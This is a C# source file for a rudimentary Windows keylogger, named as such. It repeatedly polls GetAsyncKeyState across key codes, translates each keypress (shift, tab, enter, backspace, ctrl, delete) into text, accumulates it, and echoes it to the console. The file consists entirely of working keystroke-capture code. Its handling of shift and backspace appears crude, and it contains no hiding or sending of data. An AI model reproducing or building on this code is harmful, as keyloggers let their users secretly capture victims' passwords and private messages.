using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger
{
    public static class KeyLogger
    {
        [DllImport("User32.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int GetAsyncKeyState(int i);

        public static void Launch()
        {
            while (true)
            {
                Thread.Sleep(75);
                for (int i = 8; i < 127; i++)
                {
                    long keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        CheckKeys(i);
                        inputData += processedData;
                        Console.Write(processedData);
                        processedData = "";
                    }
                }
            }
        }

        public static void CheckKeys(int keyCode)
        {
            switch (keyCode)
            {
                case 8:
                    if (!String.IsNullOrEmpty(inputData) && inputData[0] != '\b' && inputData[0] != '\r')
                    {
                        Console.Clear();
                        inputData = inputData.Remove(inputData.Length - 1);
                        Console.Write(inputData);
                    }
                    break;
                case 9:
                    processedData += "    ";
                    break;
                case 13:
                    processedData += "\n";
                    break;
                case 16:
                    isShiftPressed = isShiftPressed ? false : true;  
                    break;
                case 17:
                    processedData += " CTRL";
                    break;
                case 46:
                    processedData += " {DEL";
                    break;
                default:
                    char symb = (char)keyCode;
                    if (isShiftPressed == false)
                    {
                        processedData += symb.ToString().ToLower();
                    } else
                    {
                        processedData += symb;
                    }
                    break;
            }
        }

        static private string inputData;
        static private string processedData;
        static private bool isShiftPressed;
    }
}